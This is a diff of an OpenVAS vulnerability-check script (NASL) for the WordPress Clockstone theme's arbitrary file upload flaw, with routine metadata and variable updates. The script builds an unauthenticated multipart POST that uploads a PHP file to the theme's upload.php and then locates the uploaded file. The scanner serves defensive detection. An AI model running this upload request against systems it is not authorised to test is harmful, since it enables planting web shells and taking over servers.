@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_wordpress_clockstone_shell_12_2012.nasl 11003 2018-08-16 11:08:00Z asteins $
+# $Id: gb_wordpress_clockstone_shell_12_2012.nasl 11435 2018-09-17 13:44:25Z cfischer $
 #
 # WordPress Clockstone Theme Arbitrary File Upload Vulnerability
 #
@@ -27,17 +27,17 @@
 
 CPE = "cpe:/a:wordpress:wordpress";
 
-if (description)
+if(description)
 {
   script_xref(name:"URL", value:"http://packetstormsecurity.org/files/118930/WordPress-Clockstone-Theme-File-Upload.html");
   script_xref(name:"URL", value:"http://packetstormsecurity.org/files/download/118930/clockstone-shell.pdf");
   script_oid("1.3.6.1.4.1.25623.1.0.103626");
-  script_version("$Revision: 11003 $");
+  script_version("$Revision: 11435 $");
   script_tag(name:"cvss_base", value:"9.7");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:P");
 
   script_name("WordPress Clockstone Theme Arbitrary File Upload Vulnerability");
-  script_tag(name:"last_modification", value:"$Date: 2018-08-16 13:08:00 +0200 (Thu, 16 Aug 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-17 15:44:25 +0200 (Mon, 17 Sep 2018) $");
   script_tag(name:"creation_date", value:"2012-12-19 12:55:53 +0100 (Wed, 19 Dec 2012)");
   script_category(ACT_ATTACK);
   script_tag(name:"qod_type", value:"remote_vul");
@@ -55,26 +55,29 @@ run it in the context of the Web server process. This may
 facilitate unauthorized access or privilege escalation, other
 attacks are also possible.");
   script_tag(name:"solution", value:"Updates are available. Contact the vendor.");
- exit(0);
+
+  exit(0);
 }
 
 include("http_func.inc");
 include("host_details.inc");
 include("http_keepalive.inc");
-
+include("misc_func.inc");
 
 if(!port = get_app_port(cpe:CPE))exit(0);
 if(!dir = get_app_location(cpe:CPE, port:port))exit(0);
 
 url = dir + '/wp-content/themes/clockstone/theme/functions/upload.php';
+useragent = get_http_user_agent();
+vtstring = get_vt_string( lowercase:TRUE );
 host = http_host_name(port:port);
 
-filename = 'openvas_' + rand() + '.php';
+filename = vtstring + '_' + rand() + '.php';
 len = 363 + strlen(filename);
 
 req = 'POST ' + url + ' HTTP/1.1\r\n' +
       'Host: ' + host + '\r\n' +
-      'User-Agent: ' + OPENVAS_HTTP_USER_AGENT + '\r\n' +
+      'User-Agent: ' + useragent + '\r\n' +
       'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n' +
       'Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3\r\n' +
       'Accept-Encoding: gzip, deflate\r\n' +
@@ -96,13 +99,11 @@ req = 'POST ' + url + ' HTTP/1.1\r\n' +
      '?>\r\n' +
      '\r\n' +
      '-----------------------------176193263217941195551884621959--\r\n';
-
 res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
 
 if(res =~ "HTTP/1\.. 200" && uploaded = eregmatch(pattern:"([a-f0-9]{32}\.php)", string:res)) {
 
   if(isnull(uploaded[1]))exit(0);
-
   file = uploaded[1];
 
   url = dir + '/wp-content/themes/clockstone/theme/functions/' + file;
